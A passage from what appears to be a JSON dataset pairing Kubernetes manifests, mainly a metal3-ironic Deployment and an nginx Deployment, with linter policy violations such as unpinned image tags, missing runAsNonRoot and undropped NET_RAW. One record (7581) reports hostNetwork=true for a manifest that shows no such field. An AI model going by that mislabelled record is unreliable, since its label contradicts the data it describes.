    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  labels:\n    app: backend-feed\n  name: backend-feed\nspec:\n  ports:\n  - name: '8080'\n    port: 8080\n    targetPort: 8080\n  selector:\n    app: backend-feed\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:backend-feed])"
  },
  {
    "id": "7576",
    "manifest_path": "data/manifests/the_stack_sample/sample_2779.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: rolling-nginx\n  labels:\n    app: rolling-nginx\nspec:\n  selector:\n    matchLabels:\n      app: rolling-nginx\n  replicas: 4\n  template:\n    metadata:\n      name: rolling-nginx\n      labels:\n        app: rolling-nginx\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:1.9\n        resources:\n          requests:\n            cpu: 50m\n            memory: 50Mi\n          limits:\n            cpu: 100m\n            memory: 100Mi\n        ports:\n        - containerPort: 80\n          name: rolling-nginx\n",
    "policy_id": "no-anti-affinity",
    "violation_text": "object has 4 replicas but does not specify inter pod anti-affinity"
  },
  {
    "id": "7577",
    "manifest_path": "data/manifests/the_stack_sample/sample_2779.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: rolling-nginx\n  labels:\n    app: rolling-nginx\nspec:\n  selector:\n    matchLabels:\n      app: rolling-nginx\n  replicas: 4\n  template:\n    metadata:\n      name: rolling-nginx\n      labels:\n        app: rolling-nginx\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:1.9\n        resources:\n          requests:\n            cpu: 50m\n            memory: 50Mi\n          limits:\n            cpu: 100m\n            memory: 100Mi\n        ports:\n        - containerPort: 80\n          name: rolling-nginx\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx\" does not have a read-only root file system"
  },
  {
    "id": "7578",
    "manifest_path": "data/manifests/the_stack_sample/sample_2779.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: rolling-nginx\n  labels:\n    app: rolling-nginx\nspec:\n  selector:\n    matchLabels:\n      app: rolling-nginx\n  replicas: 4\n  template:\n    metadata:\n      name: rolling-nginx\n      labels:\n        app: rolling-nginx\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:1.9\n        resources:\n          requests:\n            cpu: 50m\n            memory: 50Mi\n          limits:\n            cpu: 100m\n            memory: 100Mi\n        ports:\n        - containerPort: 80\n          name: rolling-nginx\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx\" is not set to runAsNonRoot"
  },
  {
    "id": "7579",
    "manifest_path": "data/manifests/the_stack_sample/sample_2783.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: metal3-ironic\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: metal3-ironic\n  template:\n    metadata:\n      labels:\n        name: metal3-ironic\n    spec:\n      containers:\n      - name: ironic-dnsmasq\n        image: quay.io/metal3-io/ironic\n        imagePullPolicy: Always\n        securityContext:\n          capabilities:\n            add:\n            - NET_ADMIN\n        command:\n        - /bin/rundnsmasq\n        volumeMounts:\n        - mountPath: /shared\n          name: ironic-data-volume\n        envFrom:\n        - configMapRef:\n            name: ironic-bmo-configmap\n      - name: mariadb\n        image: quay.io/metal3-io/ironic\n        imagePullPolicy: Always\n        command:\n        - /bin/runmariadb\n        volumeMounts:\n        - mountPath: /shared\n          name: ironic-data-volume\n        env:\n        - name: MARIADB_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: mariadb-password\n              key: password\n      - name: ironic-httpd\n        image: quay.io/metal3-io/ironic\n        imagePullPolicy: Always\n        securityContext:\n          capabilities:\n            add:\n            - NET_ADMIN\n        command:\n        - /bin/runhttpd\n        volumeMounts:\n        - mountPath: /shared\n          name: ironic-data-volume\n        envFrom:\n        - configMapRef:\n            name: ironic-bmo-configmap\n      - name: ironic\n        image: quay.io/metal3-io/ironic\n        imagePullPolicy: Always\n        command:\n        - /bin/runironic\n        volumeMounts:\n        - mountPath: /shared\n          name: ironic-data-volume\n        envFrom:\n        - configMapRef:\n            name: ironic-bmo-configmap\n        env:\n        - name: MARIADB_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: mariadb-password\n              key: password\n      - name: ironic-inspector\n        image: quay.io/metal3-io/ironic-inspector\n        imagePullPolicy: Always\n        envFrom:\n        - configMapRef:\n            name: ironic-bmo-configmap\n      initContainers:\n      - name: ironic-ipa-downloader\n        image: quay.io/metal3-io/ironic-ipa-downloader\n        imagePullPolicy: Always\n        command:\n        - /usr/local/bin/get-resource.sh\n        envFrom:\n        - configMapRef:\n            name: ironic-bmo-configmap\n        volumeMounts:\n        - mountPath: /shared\n          name: ironic-data-volume\n      volumes:\n      - name: ironic-data-volume\n        emptyDir: {}\n",
    "policy_id": "drop-net-raw-capability",
    "violation_text": "container \"ironic-dnsmasq\" has DROP capabilities: [], but does not drop capability \"NET_RAW\" which is required"
  },
  {
    "id": "7580",
    "manifest_path": "data/manifests/the_stack_sample/sample_2783.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: metal3-ironic\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: metal3-ironic\n  template:\n    metadata:\n      labels:\n        name: metal3-ironic\n    spec:\n      containers:\n      - name: ironic-dnsmasq\n        image: quay.io/metal3-io/ironic\n        imagePullPolicy: Always\n        securityContext:\n          capabilities:\n            add:\n            - NET_ADMIN\n        command:\n        - /bin/rundnsmasq\n        volumeMounts:\n        - mountPath: /shared\n          name: ironic-data-volume\n        envFrom:\n        - configMapRef:\n            name: ironic-bmo-configmap\n      - name: mariadb\n        image: quay.io/metal3-io/ironic\n        imagePullPolicy: Always\n        command:\n        - /bin/runmariadb\n        volumeMounts:\n        - mountPath: /shared\n          name: ironic-data-volume\n        env:\n        - name: MARIADB_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: mariadb-password\n              key: password\n      - name: ironic-httpd\n        image: quay.io/metal3-io/ironic\n        imagePullPolicy: Always\n        securityContext:\n          capabilities:\n            add:\n            - NET_ADMIN\n        command:\n        - /bin/runhttpd\n        volumeMounts:\n        - mountPath: /shared\n          name: ironic-data-volume\n        envFrom:\n        - configMapRef:\n            name: ironic-bmo-configmap\n      - name: ironic\n        image: quay.io/metal3-io/ironic\n        imagePullPolicy: Always\n        command:\n        - /bin/runironic\n        volumeMounts:\n        - mountPath: /shared\n          name: ironic-data-volume\n        envFrom:\n        - configMapRef:\n            name: ironic-bmo-configmap\n        env:\n        - name: MARIADB_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: mariadb-password\n              key: password\n      - name: ironic-inspector\n        image: quay.io/metal3-io/ironic-inspector\n        imagePullPolicy: Always\n        envFrom:\n        - configMapRef:\n            name: ironic-bmo-configmap\n      initContainers:\n      - name: ironic-ipa-downloader\n        image: quay.io/metal3-io/ironic-ipa-downloader\n        imagePullPolicy: Always\n        command:\n        - /usr/local/bin/get-resource.sh\n        envFrom:\n        - configMapRef:\n            name: ironic-bmo-configmap\n        volumeMounts:\n        - mountPath: /shared\n          name: ironic-data-volume\n      volumes:\n      - name: ironic-data-volume\n        emptyDir: {}\n",
    "policy_id": "drop-net-raw-capability",
    "violation_text": "container \"ironic-httpd\" has DROP capabilities: [], but does not drop capability \"NET_RAW\" which is required"
  },
  {
    "id": "7581",
    "manifest_path": "data/manifests/the_stack_sample/sample_2783.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: metal3-ironic\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: metal3-ironic\n  template:\n    metadata:\n      labels:\n        name: metal3-ironic\n    spec:\n      containers:\n      - name: ironic-dnsmasq\n        image: quay.io/metal3-io/ironic\n        imagePullPolicy: Always\n        securityContext:\n          capabilities:\n            add:\n            - NET_ADMIN\n        command:\n        - /bin/rundnsmasq\n        volumeMounts:\n        - mountPath: /shared\n          name: ironic-data-volume\n        envFrom:\n        - configMapRef:\n            name: ironic-bmo-configmap\n      - name: mariadb\n        image: quay.io/metal3-io/ironic\n        imagePullPolicy: Always\n        command:\n        - /bin/runmariadb\n        volumeMounts:\n        - mountPath: /shared\n          name: ironic-data-volume\n        env:\n        - name: MARIADB_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: mariadb-password\n              key: password\n      - name: ironic-httpd\n        image: quay.io/metal3-io/ironic\n        imagePullPolicy: Always\n        securityContext:\n          capabilities:\n            add:\n            - NET_ADMIN\n        command:\n        - /bin/runhttpd\n        volumeMounts:\n        - mountPath: /shared\n          name: ironic-data-volume\n        envFrom:\n        - configMapRef:\n            name: ironic-bmo-configmap\n      - name: ironic\n        image: quay.io/metal3-io/ironic\n        imagePullPolicy: Always\n        command:\n        - /bin/runironic\n        volumeMounts:\n        - mountPath: /shared\n          name: ironic-data-volume\n        envFrom:\n        - configMapRef:\n            name: ironic-bmo-configmap\n        env:\n        - name: MARIADB_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: mariadb-password\n              key: password\n      - name: ironic-inspector\n        image: quay.io/metal3-io/ironic-inspector\n        imagePullPolicy: Always\n        envFrom:\n        - configMapRef:\n            name: ironic-bmo-configmap\n      initContainers:\n      - name: ironic-ipa-downloader\n        image: quay.io/metal3-io/ironic-ipa-downloader\n        imagePullPolicy: Always\n        command:\n        - /usr/local/bin/get-resource.sh\n        envFrom:\n        - configMapRef:\n            name: ironic-bmo-configmap\n        volumeMounts:\n        - mountPath: /shared\n          name: ironic-data-volume\n      volumes:\n      - name: ironic-data-volume\n        emptyDir: {}\n",
    "policy_id": "host-network",
    "violation_text": "resource shares host's network namespace (via hostNetwork=true)."
  },
  {
    "id": "7582",
    "manifest_path": "data/manifests/the_stack_sample/sample_2783.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: metal3-ironic\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: metal3-ironic\n  template:\n    metadata:\n      labels:\n        name: metal3-ironic\n    spec:\n      containers:\n      - name: ironic-dnsmasq\n        image: quay.io/metal3-io/ironic\n        imagePullPolicy: Always\n        securityContext:\n          capabilities:\n            add:\n            - NET_ADMIN\n        command:\n        - /bin/rundnsmasq\n        volumeMounts:\n        - mountPath: /shared\n          name: ironic-data-volume\n        envFrom:\n        - configMapRef:\n            name: ironic-bmo-configmap\n      - name: mariadb\n        image: quay.io/metal3-io/ironic\n        imagePullPolicy: Always\n        command:\n        - /bin/runmariadb\n        volumeMounts:\n        - mountPath: /shared\n          name: ironic-data-volume\n        env:\n        - name: MARIADB_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: mariadb-password\n              key: password\n      - name: ironic-httpd\n        image: quay.io/metal3-io/ironic\n        imagePullPolicy: Always\n        securityContext:\n          capabilities:\n            add:\n            - NET_ADMIN\n        command:\n        - /bin/runhttpd\n        volumeMounts:\n        - mountPath: /shared\n          name: ironic-data-volume\n        envFrom:\n        - configMapRef:\n            name: ironic-bmo-configmap\n      - name: ironic\n        image: quay.io/metal3-io/ironic\n        imagePullPolicy: Always\n        command:\n        - /bin/runironic\n        volumeMounts:\n        - mountPath: /shared\n          name: ironic-data-volume\n        envFrom:\n        - configMapRef:\n            name: ironic-bmo-configmap\n        env:\n        - name: MARIADB_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: mariadb-password\n              key: password\n      - name: ironic-inspector\n        image: quay.io/metal3-io/ironic-inspector\n        imagePullPolicy: Always\n        envFrom:\n        - configMapRef:\n            name: ironic-bmo-configmap\n      initContainers:\n      - name: ironic-ipa-downloader\n        image: quay.io/metal3-io/ironic-ipa-downloader\n        imagePullPolicy: Always\n        command:\n        - /usr/local/bin/get-resource.sh\n        envFrom:\n        - configMapRef:\n            name: ironic-bmo-configmap\n        volumeMounts:\n        - mountPath: /shared\n          name: ironic-data-volume\n      volumes:\n      - name: ironic-data-volume\n        emptyDir: {}\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"ironic\" is using an invalid container image, \"quay.io/metal3-io/ironic\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "7583",
    "manifest_path": "data/manifests/the_stack_sample/sample_2783.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: metal3-ironic\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: metal3-ironic\n  template:\n    metadata:\n      labels:\n        name: metal3-ironic\n    spec:\n      containers:\n      - name: ironic-dnsmasq\n        image: quay.io/metal3-io/ironic\n        imagePullPolicy: Always\n        securityContext:\n          capabilities:\n            add:\n            - NET_ADMIN\n        command:\n        - /bin/rundnsmasq\n        volumeMounts:\n        - mountPath: /shared\n          name: ironic-data-volume\n        envFrom:\n        - configMapRef:\n            name: ironic-bmo-configmap\n      - name: mariadb\n        image: quay.io/metal3-io/ironic\n        imagePullPolicy: Always\n        command:\n        - /bin/runmariadb\n        volumeMounts:\n        - mountPath: /shared\n          name: ironic-data-volume\n        env:\n        - name: MARIADB_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: mariadb-password\n              key: password\n      - name: ironic-httpd\n        image: quay.io/metal3-io/ironic\n        imagePullPolicy: Always\n        securityContext:\n          capabilities:\n            add:\n            - NET_ADMIN\n        command:\n        - /bin/runhttpd\n        volumeMounts:\n        - mountPath: /shared\n          name: ironic-data-volume\n        envFrom:\n        - configMapRef:\n            name: ironic-bmo-configmap\n      - name: ironic\n        image: quay.io/metal3-io/ironic\n        imagePullPolicy: Always\n        command:\n        - /bin/runironic\n        volumeMounts:\n        - mountPath: /shared\n          name: ironic-data-volume\n        envFrom:\n        - configMapRef:\n            name: ironic-bmo-configmap\n        env:\n        - name: MARIADB_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: mariadb-password\n              key: password\n      - name: ironic-inspector\n        image: quay.io/metal3-io/ironic-inspector\n        imagePullPolicy: Always\n        envFrom:\n        - configMapRef:\n            name: ironic-bmo-configmap\n      initContainers:\n      - name: ironic-ipa-downloader\n        image: quay.io/metal3-io/ironic-ipa-downloader\n        imagePullPolicy: Always\n        command:\n        - /usr/local/bin/get-resource.sh\n        envFrom:\n        - configMapRef:\n            name: ironic-bmo-configmap\n        volumeMounts:\n        - mountPath: /shared\n          name: ironic-data-volume\n      volumes:\n      - name: ironic-data-volume\n        emptyDir: {}\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"ironic-dnsmasq\" is using an invalid container image, \"quay.io/metal3-io/ironic\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "7584",
    "manifest_path": "data/manifests/the_stack_sample/sample_2783.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: metal3-ironic\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: metal3-ironic\n  template:\n    metadata:\n      labels:\n        name: metal3-ironic\n    spec:\n      containers:\n      - name: ironic-dnsmasq\n        image: quay.io/metal3-io/ironic\n        imagePullPolicy: Always\n        securityContext:\n          capabilities:\n            add:\n            - NET_ADMIN\n        command:\n        - /bin/rundnsmasq\n        volumeMounts:\n        - mountPath: /shared\n          name: ironic-data-volume\n        envFrom:\n        - configMapRef:\n            name: ironic-bmo-configmap\n      - name: mariadb\n        image: quay.io/metal3-io/ironic\n        imagePullPolicy: Always\n        command:\n        - /bin/runmariadb\n        volumeMounts:\n        - mountPath: /shared\n          name: ironic-data-volume\n        env:\n        - name: MARIADB_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: mariadb-password\n              key: password\n      - name: ironic-httpd\n        image: quay.io/metal3-io/ironic\n        imagePullPolicy: Always\n        securityContext:\n          capabilities:\n            add:\n            - NET_ADMIN\n        command:\n        - /bin/runhttpd\n        volumeMounts:\n        - mountPath: /shared\n          name: ironic-data-volume\n        envFrom:\n        - configMapRef:\n            name: ironic-bmo-configmap\n      - name: ironic\n        image: quay.io/metal3-io/ironic\n        imagePullPolicy: Always\n        command:\n        - /bin/runironic\n        volumeMounts:\n        - mountPath: /shared\n          name: ironic-data-volume\n        envFrom:\n        - configMapRef:\n            name: ironic-bmo-configmap\n        env:\n        - name: MARIADB_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: mariadb-password\n              key: password\n      - name: ironic-inspector\n        image: quay.io/metal3-io/ironic-inspector\n        imagePullPolicy: Always\n        envFrom:\n        - configMapRef:\n            name: ironic-bmo-configmap\n      initContainers:\n      - name: ironic-ipa-downloader\n        image: quay.io/metal3-io/ironic-ipa-downloader\n        imagePullPolicy: Always\n        command:\n        - /usr/local/bin/get-resource.sh\n        envFrom:\n        - configMapRef:\n            name: ironic-bmo-configmap\n        volumeMounts:\n        - mountPath: /shared\n          name: ironic-data-volume\n      volumes:\n      - name: ironic-data-volume\n        emptyDir: {}\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"ironic-httpd\" is using an invalid container image, \"quay.io/metal3-io/ironic\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "7585",
    "manifest_path": "data/manifests/the_stack_sample/sample_2783.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: metal3-ironic\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: metal3-ironic\n  template:\n    metadata:\n      labels:\n        name: metal3-ironic\n    spec:\n      containers:\n      - name: ironic-dnsmasq\n        image: quay.io/metal3-io/ironic\n        imagePullPolicy: Always\n        securityContext:\n          capabilities:\n            add:\n            - NET_ADMIN\n        command:\n        - /bin/rundnsmasq\n        volumeMounts:\n        - mountPath: /shared\n          name: ironic-data-volume\n        envFrom:\n        - configMapRef:\n            name: ironic-bmo-configmap\n      - name: mariadb\n        image: quay.io/metal3-io/ironic\n        imagePullPolicy: Always\n        command:\n        - /bin/runmariadb\n        volumeMounts:\n        - mountPath: /shared\n          name: ironic-data-volume\n        env:\n        - name: MARIADB_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: mariadb-password\n              key: password\n      - name: ironic-httpd\n        image: quay.io/metal3-io/ironic\n        imagePullPolicy: Always\n        securityContext:\n          capabilities:\n            add:\n            - NET_ADMIN\n        command:\n        - /bin/runhttpd\n        volumeMounts:\n        - mountPath: /shared\n          name: ironic-data-volume\n        envFrom:\n        - configMapRef:\n            name: ironic-bmo-configmap\n      - name: ironic\n        image: quay.io/metal3-io/ironic\n        imagePullPolicy: Always\n        command:\n        - /bin/runironic\n        volumeMounts:\n        - mountPath: /shared\n          name: ironic-data-volume\n        envFrom:\n        - configMapRef:\n            name: ironic-bmo-configmap\n        env:\n        - name: MARIADB_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: mariadb-password\n              key: password\n      - name: ironic-inspector\n        image: quay.io/metal3-io/ironic-inspector\n        imagePullPolicy: Always\n        envFrom:\n        - configMapRef:\n            name: ironic-bmo-configmap\n      initContainers:\n      - name: ironic-ipa-downloader\n        image: quay.io/metal3-io/ironic-ipa-downloader\n        imagePullPolicy: Always\n        command:\n        - /usr/local/bin/get-resource.sh\n        envFrom:\n        - configMapRef:\n            name: ironic-bmo-configmap\n        volumeMounts:\n        - mountPath: /shared\n          name: ironic-data-volume\n      volumes:\n      - name: ironic-data-volume\n        emptyDir: {}\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"ironic-inspector\" is using an invalid container image, \"quay.io/metal3-io/ironic-inspector\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "7586",
    "manifest_path": "data/manifests/the_stack_sample/sample_2783.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: metal3-ironic\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: metal3-ironic\n  template:\n    metadata:\n      labels:\n        name: metal3-ironic\n    spec:\n      containers:\n      - name: ironic-dnsmasq\n        image: quay.io/metal3-io/ironic\n        imagePullPolicy: Always\n        securityContext:\n          capabilities:\n            add:\n            - NET_ADMIN\n        command:\n        - /bin/rundnsmasq\n        volumeMounts:\n        - mountPath: /shared\n          name: ironic-data-volume\n        envFrom:\n        - configMapRef:\n            name: ironic-bmo-configmap\n      - name: mariadb\n        image: quay.io/metal3-io/ironic\n        imagePullPolicy: Always\n        command:\n        - /bin/runmariadb\n        volumeMounts:\n        - mountPath: /shared\n          name: ironic-data-volume\n        env:\n        - name: MARIADB_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: mariadb-password\n              key: password\n      - name: ironic-httpd\n        image: quay.io/metal3-io/ironic\n        imagePullPolicy: Always\n        securityContext:\n          capabilities:\n            add:\n            - NET_ADMIN\n        command:\n        - /bin/runhttpd\n        volumeMounts:\n        - mountPath: /shared\n          name: ironic-data-volume\n        envFrom:\n        - configMapRef:\n            name: ironic-bmo-configmap\n      - name: ironic\n        image: quay.io/metal3-io/ironic\n        imagePullPolicy: Always\n        command:\n        - /bin/runironic\n        volumeMounts:\n        - mountPath: /shared\n          name: ironic-data-volume\n        envFrom:\n        - configMapRef:\n            name: ironic-bmo-configmap\n        env:\n        - name: MARIADB_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: mariadb-password\n              key: password\n      - name: ironic-inspector\n        image: quay.io/metal3-io/ironic-inspector\n        imagePullPolicy: Always\n        envFrom:\n        - configMapRef:\n            name: ironic-bmo-configmap\n      initContainers:\n      - name: ironic-ipa-downloader\n        image: quay.io/metal3-io/ironic-ipa-downloader\n        imagePullPolicy: Always\n        command:\n        - /usr/local/bin/get-resource.sh\n        envFrom:\n        - configMapRef:\n            name: ironic-bmo-configmap\n        volumeMounts:\n        - mountPath: /shared\n          name: ironic-data-volume\n      volumes:\n      - name: ironic-data-volume\n        emptyDir: {}\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"ironic-ipa-downloader\" is using an invalid container image, \"quay.io/metal3-io/ironic-ipa-downloader\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "7587",
    "manifest_path": "data/manifests/the_stack_sample/sample_2783.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: metal3-ironic\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: metal3-ironic\n  template:\n    metadata:\n      labels:\n        name: metal3-ironic\n    spec:\n      containers:\n      - name: ironic-dnsmasq\n        image: quay.io/metal3-io/ironic\n        imagePullPolicy: Always\n        securityContext:\n          capabilities:\n            add:\n            - NET_ADMIN\n        command:\n        - /bin/rundnsmasq\n        volumeMounts:\n        - mountPath: /shared\n          name: ironic-data-volume\n        envFrom:\n        - configMapRef:\n            name: ironic-bmo-configmap\n      - name: mariadb\n        image: quay.io/metal3-io/ironic\n        imagePullPolicy: Always\n        command:\n        - /bin/runmariadb\n        volumeMounts:\n        - mountPath: /shared\n          name: ironic-data-volume\n        env:\n        - name: MARIADB_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: mariadb-password\n              key: password\n      - name: ironic-httpd\n        image: quay.io/metal3-io/ironic\n        imagePullPolicy: Always\n        securityContext:\n          capabilities:\n            add:\n            - NET_ADMIN\n        command:\n        - /bin/runhttpd\n        volumeMounts:\n        - mountPath: /shared\n          name: ironic-data-volume\n        envFrom:\n        - configMapRef:\n            name: ironic-bmo-configmap\n      - name: ironic\n        image: quay.io/metal3-io/ironic\n        imagePullPolicy: Always\n        command:\n        - /bin/runironic\n        volumeMounts:\n        - mountPath: /shared\n          name: ironic-data-volume\n        envFrom:\n        - configMapRef:\n            name: ironic-bmo-configmap\n        env:\n        - name: MARIADB_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: mariadb-password\n              key: password\n      - name: ironic-inspector\n        image: quay.io/metal3-io/ironic-inspector\n        imagePullPolicy: Always\n        envFrom:\n        - configMapRef:\n            name: ironic-bmo-configmap\n      initContainers:\n      - name: ironic-ipa-downloader\n        image: quay.io/metal3-io/ironic-ipa-downloader\n        imagePullPolicy: Always\n        command:\n        - /usr/local/bin/get-resource.sh\n        envFrom:\n        - configMapRef:\n            name: ironic-bmo-configmap\n        volumeMounts:\n        - mountPath: /shared\n          name: ironic-data-volume\n      volumes:\n      - name: ironic-data-volume\n        emptyDir: {}\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"mariadb\" is using an invalid container image, \"quay.io/metal3-io/ironic\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "7588",
    "manifest_path": "data/manifests/the_stack_sample/sample_2783.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: metal3-ironic\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: metal3-ironic\n  template:\n    metadata:\n      labels:\n        name: metal3-ironic\n    spec:\n      containers:\n      - name: ironic-dnsmasq\n        image: quay.io/metal3-io/ironic\n        imagePullPolicy: Always\n        securityContext:\n          capabilities:\n            add:\n            - NET_ADMIN\n        command:\n        - /bin/rundnsmasq\n        volumeMounts:\n        - mountPath: /shared\n          name: ironic-data-volume\n        envFrom:\n        - configMapRef:\n            name: ironic-bmo-configmap\n      - name: mariadb\n        image: quay.io/metal3-io/ironic\n        imagePullPolicy: Always\n        command:\n        - /bin/runmariadb\n        volumeMounts:\n        - mountPath: /shared\n          name: ironic-data-volume\n        env:\n        - name: MARIADB_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: mariadb-password\n              key: password\n      - name: ironic-httpd\n        image: quay.io/metal3-io/ironic\n        imagePullPolicy: Always\n        securityContext:\n          capabilities:\n            add:\n            - NET_ADMIN\n        command:\n        - /bin/runhttpd\n        volumeMounts:\n        - mountPath: /shared\n          name: ironic-data-volume\n        envFrom:\n        - configMapRef:\n            name: ironic-bmo-configmap\n      - name: ironic\n        image: quay.io/metal3-io/ironic\n        imagePullPolicy: Always\n        command:\n        - /bin/runironic\n        volumeMounts:\n        - mountPath: /shared\n          name: ironic-data-volume\n        envFrom:\n        - configMapRef:\n            name: ironic-bmo-configmap\n        env:\n        - name: MARIADB_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: mariadb-password\n              key: password\n      - name: ironic-inspector\n        image: quay.io/metal3-io/ironic-inspector\n        imagePullPolicy: Always\n        envFrom:\n        - configMapRef:\n            name: ironic-bmo-configmap\n      initContainers:\n      - name: ironic-ipa-downloader\n        image: quay.io/metal3-io/ironic-ipa-downloader\n        imagePullPolicy: Always\n        command:\n        - /usr/local/bin/get-resource.sh\n        envFrom:\n        - configMapRef:\n            name: ironic-bmo-configmap\n        volumeMounts:\n        - mountPath: /shared\n          name: ironic-data-volume\n      volumes:\n      - name: ironic-data-volume\n        emptyDir: {}\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"ironic\" does not have a read-only root file system"
  },
  {
    "id": "7589",
    "manifest_path": "data/manifests/the_stack_sample/sample_2783.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: metal3-ironic\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: metal3-ironic\n  template:\n    metadata:\n      labels:\n        name: metal3-ironic\n    spec:\n      containers:\n      - name: ironic-dnsmasq\n        image: quay.io/metal3-io/ironic\n        imagePullPolicy: Always\n        securityContext:\n          capabilities:\n            add:\n            - NET_ADMIN\n        command:\n        - /bin/rundnsmasq\n        volumeMounts:\n        - mountPath: /shared\n          name: ironic-data-volume\n        envFrom:\n        - configMapRef:\n            name: ironic-bmo-configmap\n      - name: mariadb\n        image: quay.io/metal3-io/ironic\n        imagePullPolicy: Always\n        command:\n        - /bin/runmariadb\n        volumeMounts:\n        - mountPath: /shared\n          name: ironic-data-volume\n        env:\n        - name: MARIADB_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: mariadb-password\n              key: password\n      - name: ironic-httpd\n        image: quay.io/metal3-io/ironic\n        imagePullPolicy: Always\n        securityContext:\n          capabilities:\n            add:\n            - NET_ADMIN\n        command:\n        - /bin/runhttpd\n        volumeMounts:\n        - mountPath: /shared\n          name: ironic-data-volume\n        envFrom:\n        - configMapRef:\n            name: ironic-bmo-configmap\n      - name: ironic\n        image: quay.io/metal3-io/ironic\n        imagePullPolicy: Always\n        command:\n        - /bin/runironic\n        volumeMounts:\n        - mountPath: /shared\n          name: ironic-data-volume\n        envFrom:\n        - configMapRef:\n            name: ironic-bmo-configmap\n        env:\n        - name: MARIADB_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: mariadb-password\n              key: password\n      - name: ironic-inspector\n        image: quay.io/metal3-io/ironic-inspector\n        imagePullPolicy: Always\n        envFrom:\n        - configMapRef:\n            name: ironic-bmo-configmap\n      initContainers:\n      - name: ironic-ipa-downloader\n        image: quay.io/metal3-io/ironic-ipa-downloader\n        imagePullPolicy: Always\n        command:\n        - /usr/local/bin/get-resource.sh\n        envFrom:\n        - configMapRef:\n            name: ironic-bmo-configmap\n        volumeMounts:\n        - mountPath: /shared\n          name: ironic-data-volume\n      volumes:\n      - name: ironic-data-volume\n        emptyDir: {}\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"ironic-dnsmasq\" does not have a read-only root file system"
  },
  {
    "id": "7590",
    "manifest_path": "data/manifests/the_stack_sample/sample_2783.yaml",
